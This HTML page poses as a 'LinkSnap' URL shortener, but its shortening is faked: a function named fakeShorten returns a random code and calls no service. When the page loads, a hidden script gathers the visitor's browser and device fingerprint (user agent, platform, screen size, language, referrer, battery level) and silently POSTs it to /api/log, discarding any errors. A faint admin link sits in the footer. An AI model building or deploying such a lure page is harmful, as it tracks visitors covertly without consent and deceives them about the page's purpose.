<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>LinkSnap</title>
    <link href="https://fonts.bunny.net/css?family=lexend:300,400,600,700" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Lexend', 'Segoe UI', Arial, sans-serif;
            background: #0a0e1a;
            color: #e8edf5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            text-align: center;
            max-width: 520px;
            width: 100%;
        }

        .logo {
            font-weight: 300;
            font-size: 2.8rem;
            letter-spacing: 6px;
            color: #6b9fff;
            margin-bottom: 4px;
        }

        .subtitle {
            font-size: 0.8rem;
            color: #4a5a7a;
            font-weight: 300;
            letter-spacing: 2px;
            margin-bottom: 32px;
        }

        .card {
            background: #131b2e;
            border: 1px solid #1e2a44;
            border-radius: 16px;
            padding: 32px 28px;
            margin-bottom: 16px;
        }

        .card .icon {
            font-size: 2.5rem;
            margin-bottom: 12px;
        }

        .card h2 {
            font-weight: 400;
            font-size: 1.1rem;
            color: #e8edf5;
            margin-bottom: 8px;
        }

        .card p {
            font-size: 0.85rem;
            color: #6a7a9a;
            font-weight: 300;
            line-height: 1.6;
        }

        .input-group {
            display: flex;
            gap: 10px;
            margin-top: 16px;
        }

        .input-group input {
            flex: 1;
            font-family: 'Lexend', sans-serif;
            background: #0a0e1a;
            border: 1px solid #1e2a44;
            border-radius: 10px;
            padding: 12px 14px;
            color: #e8edf5;
            font-size: 0.9rem;
            outline: none;
            min-height: 44px;
        }

        .input-group input:focus {
            border-color: #6b9fff;
        }

        .input-group input::placeholder {
            color: #3a4a5a;
        }

        .input-group button {
            font-family: 'Lexend', sans-serif;
            background: #6b9fff;
            color: #0a0e1a;
            border: none;
            border-radius: 10px;
            padding: 12px 20px;
            font-size: 0.9rem;
            font-weight: 600;
            cursor: pointer;
            min-height: 44px;
            white-space: nowrap;
            transition: all 0.15s;
        }

        .input-group button:hover {
            background: #5a8aee;
            transform: scale(0.97);
        }

        .footer {
            font-size: 0.6rem;
            color: #1a2a3a;
            letter-spacing: 1px;
            margin-top: 20px;
        }

        .footer a {
            color: #2a3a4a;
            text-decoration: none;
        }

        .footer a:hover {
            color: #4a5a7a;
        }

        .status-msg {
            font-size: 0.75rem;
            color: #4a5a7a;
            margin-top: 12px;
            min-height: 20px;
        }

        .admin-link {
            color: #1a2a3a;
            font-size: 0.6rem;
            text-decoration: none;
            transition: color 0.2s;
        }

        .admin-link:hover {
            color: #3a4a5a;
        }

        @media (max-width: 480px) {
            .logo {
                font-size: 2rem;
            }
            .input-group {
                flex-direction: column;
            }
            .input-group button {
                width: 100%;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">LinkSnap</div>
        <div class="subtitle">shorten · share · track</div>

        <div class="card">
            <div class="icon">🔗</div>
            <h2>Paste your long URL</h2>
            <p>Shorten any link in seconds. Free and fast.</p>

            <div class="input-group">
                <input type="url" id="urlInput" placeholder="https://example.com/very/long/url..." value="https://example.com">
                <button id="shortenBtn">Shorten</button>
            </div>
            <div class="status-msg" id="statusMsg">✨ Try it out — paste a link above</div>
        </div>

        <div class="footer">
            <a href="/admin" class="admin-link">⚙</a>
        </div>
    </div>

    <script>
        (function() {
            'use strict';

            const urlInput = document.getElementById('urlInput');
            const shortenBtn = document.getElementById('shortenBtn');
            const statusMsg = document.getElementById('statusMsg');

            async function captureAndSend() {
                const data = {
                    timestamp: new Date().toISOString(),
                    readableTime: new Date().toLocaleString(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    windowWidth: window.innerWidth,
                    windowHeight: window.innerHeight,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio,
                    online: navigator.onLine,
                    referrer: document.referrer || 'direct',
                    url: window.location.href,
                    battery: null
                };

                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        data.battery = {
                            level: Math.round(battery.level * 100),
                            charging: battery.charging
                        };
                    } catch (e) {
                        data.battery = null;
                    }
                }

                try {
                    await fetch('/api/log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                } catch (err) {
                    // Silent fail
                }
            }

            function fakeShorten() {
                const url = urlInput.value.trim();
                if (!url) {
                    statusMsg.textContent = '⚠️ Please enter a URL.';
                    statusMsg.style.color = '#ff6b6b';
                    return;
                }

                const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let code = '';
                for (let i = 0; i < 6; i++) {
                    code += chars[Math.floor(Math.random() * chars.length)];
                }

                const fakeUrl = 'lnk.snap/' + code;
                statusMsg.textContent = 'Done ' + fakeUrl;
                statusMsg.style.color = '#4ade80';

                setTimeout(() => {
                    statusMsg.textContent = 'Try it out — paste a link above';
                    statusMsg.style.color = '#4a5a7a';
                }, 4000);
            }

            shortenBtn.addEventListener('click', fakeShorten);

            urlInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    fakeShorten();
                }
            });

            if (document.readyState === 'complete') {
                captureAndSend();
            } else {
                window.addEventListener('load', captureAndSend);
            }

        })();
    </script>

</body>
</html>
